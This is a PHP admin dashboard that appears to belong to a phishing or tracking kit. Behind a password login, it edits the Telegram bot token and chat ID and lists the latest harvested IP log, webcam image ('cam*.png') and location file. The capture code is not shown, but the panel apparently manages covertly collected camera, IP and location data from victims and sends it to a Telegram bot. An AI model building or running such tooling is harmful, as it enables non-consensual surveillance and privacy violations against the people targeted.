<?php
session_start();
require_once 'config.php';

// Simple login check
if (!isset($_SESSION['admin'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], ADMIN_PASSWORD_HASH)) {
            $_SESSION['admin'] = true;
            header('Location: dashboard.php');
            exit;
        } else {
            $error = 'Invalid password';
        }
    }
    echo '<form method="post"><h2>Admin Login</h2>';
    if (!empty($error)) echo '<p style="color:red">'.$error.'</p>';
    echo '<input type="password" name="password" placeholder="Password" required /> <button type="submit">Login</button></form>';
    exit;
}

// Read current credentials (from env or config)
$bot_token = TELEGRAM_BOT_TOKEN;
$chat_id = TELEGRAM_CHAT_ID;

// Status info (last IP, last cam, last location)
function get_last_file($pattern) {
    $files = glob($pattern);
    if (!$files) return 'None';
    usort($files, function($a, $b) { return filemtime($b) - filemtime($a); });
    return basename($files[0]) . ' (' . date('Y-m-d H:i:s', filemtime($files[0])) . ')';
}
$last_ip = get_last_file('ip.txt');
$last_cam = get_last_file('cam*.png');
$last_loc = get_last_file('location_*.txt');

?>
<!DOCTYPE html>
<html><head><title>Dashboard</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:sans-serif;background:#222;color:#eee;padding:2em;}input,button{padding:0.5em;margin:0.2em;}form{margin-bottom:2em;}label{display:block;margin-top:1em;}a{color:#6cf;}</style></head><body>
<h1>Telegram Bot Credentials</h1>
<form method="post" action="save_credentials.php">
<label>Bot Token:<br><input type="text" name="bot_token" value="<?=htmlspecialchars($bot_token)?>" required></label>
<label>Chat ID:<br><input type="text" name="chat_id" value="<?=htmlspecialchars($chat_id)?>" required></label>
<button type="submit">Update</button>
</form>
<h2>Status</h2>
<ul>
<li>Last IP log: <?=$last_ip?></li>
<li>Last cam file: <?=$last_cam?></li>
<li>Last location: <?=$last_loc?></li>
</ul>
<form method="post" action="dashboard.php"><button name="logout" value="1">Logout</button></form>
</body></html>
<?php
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: dashboard.php');
    exit;
}
